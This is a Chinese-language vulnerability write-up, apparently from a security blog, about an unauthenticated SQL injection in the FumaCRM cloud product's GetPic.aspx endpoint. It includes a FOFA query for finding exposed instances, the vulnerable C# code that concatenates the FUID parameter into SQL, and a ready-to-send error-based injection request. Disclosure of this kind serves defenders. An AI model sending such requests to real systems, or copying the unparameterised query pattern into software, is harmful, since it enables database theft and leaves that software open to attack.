---
title: "孚盟云CRM GetPic.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-GetPic-FUID-sqli.html
asset_dir: assets/孚盟云crm-getpic.aspx-sql注入漏洞
---

# 孚盟云CRM GetPic.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/18 12:27
- 888浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

漏洞扫描器

Web安全书籍

技术文章订阅

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetPic.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetPic.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetPic` 方法的实现如下

```
public class GetPic : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    DataTable table = this.dbHelper.Query($"select * from dcFile where FUID='{this.Request.QueryString["FUID"]}'").Tables[0];
```

深入探索

服务器安全服务

JSON处理工具

传输层安全性协议

未经过滤或参数化绑定的参数 `FUID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetPic.aspx?FUID=%2d%31%27%41%4e%44%20%31%3d%40%40%56%45%52%53%49%4f%4e%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetPic.aspx SQL注入漏洞](images/img-001-fc2e1aaf130f.webp)](https://image.mrxn.net/0fe68a73b8474d47bde4872003d1f674.webp)

通过报错注入 成功在响应回显数据版本信息

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
